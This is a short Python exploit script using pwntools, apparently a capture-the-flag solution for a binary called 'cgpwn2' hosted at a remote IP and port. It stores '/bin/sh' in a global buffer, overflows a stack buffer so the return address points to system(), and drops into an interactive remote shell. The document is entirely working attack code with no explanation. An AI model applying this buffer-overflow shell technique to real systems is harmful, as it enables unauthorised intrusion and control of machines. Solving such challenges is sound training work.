from pwn import *

io = remote('111.200.241.244', 56171)
e = ELF('./cgpwn2')
system_address = e.symbols['system']
info('system_address => 0x%x', system_address)
name_address = 0x804A080 
payload = b'a'*0x26 + b'fuck' + p32(system_address) + p32(0xdeadbeef) + p32(name_address)
io.sendlineafter(b'please tell me your name', b'/bin/sh')
io.sendlineafter(b'hello,you can leave some message here:', payload)
io.interactive()